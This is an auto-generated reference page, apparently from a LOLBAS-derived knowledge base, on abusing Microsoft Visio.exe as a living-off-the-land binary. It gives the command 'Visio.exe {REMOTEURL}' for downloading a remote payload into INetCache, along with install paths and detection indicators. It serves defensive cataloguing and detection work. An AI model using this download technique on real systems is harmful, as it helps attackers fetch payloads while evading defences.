---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Visio.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `visio.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Visio.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Visio.exe](../../tools/windows/visio.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | visio.exe |
| name | Visio.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@AvihayEldad'
  Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
  Command: Visio.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2024-02-15
Description: Microsoft Visio Executable
Detection:
- IOC: URL on a visio.exe command line
- IOC: visio.exe making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe
- Path: C:\Program Files\Microsoft Office\Office14\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe
- Path: C:\Program Files\Microsoft Office\Office15\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\Visio.exe
- Path: C:\Program Files\Microsoft Office\Office16\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office14\Visio.exe
- Path: C:\Program Files\Microsoft Office\root\Office14\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office15\Visio.exe
- Path: C:\Program Files\Microsoft Office\root\Office15\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office16\Visio.exe
- Path: C:\Program Files\Microsoft Office\root\Office16\Visio.exe
Name: Visio.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Visio.yml
```

## Detection / Analysis Notes

```text
IOC: URL on a visio.exe command line
```

```text
IOC: visio.exe making unexpected network connections or DNS requests
```

```text
- IOC: URL on a visio.exe command line
- IOC: visio.exe making unexpected network connections or DNS requests
```
